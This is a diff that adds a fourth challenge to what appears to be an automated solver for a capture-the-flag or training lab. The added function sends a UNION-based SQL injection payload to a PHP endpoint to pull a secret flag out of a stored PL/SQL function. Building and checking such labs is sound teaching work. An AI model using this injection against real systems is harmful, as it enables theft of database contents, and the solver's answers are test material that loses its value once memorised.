@@ -176,6 +176,19 @@ def challenge3(student: requests.Session) -> str:
         server.shutdown()
 
 
+def challenge4(session: requests.Session) -> str:
+    log("[*] Challenge 4: PL/SQL injection via EXECUTE IMMEDIATE ...")
+    # The PHP binds the argument, but FN_COURSE_LOOKUP concatenates it into
+    # dynamic SQL, so the injection lands inside the stored function. Filter to
+    # a single row to avoid the TOO_MANY_ROWS decoy trap.
+    payload = "zzz' UNION SELECT secret_flag FROM PLSQL_VAULT WHERE label='CHALLENGE_4'--"
+    r = session.get(f"{TARGET}/course_lookup.php", params={"code": payload}, timeout=TIMEOUT)
+    m = FLAG_RE.search(html.unescape(r.text))
+    assert m, "PL/SQL injection did not reveal a flag (stored function may be fixed)"
+    log(f"[+] Challenge 4 flag: {m.group(0)}")
+    return m.group(0)
+
+
 def main() -> int:
     wait_for_stack()
     results: dict[str, bool] = {}
@@ -185,7 +198,8 @@ def main() -> int:
 
     for name, fn in (("Challenge 1", lambda: challenge1(student)),
                      ("Challenge 2", lambda: challenge2(student)),
-                     ("Challenge 3", lambda: challenge3(student))):
+                     ("Challenge 3", lambda: challenge3(student)),
+                     ("Challenge 4", lambda: challenge4(student))):
         try:
             fn()
             results[name] = True
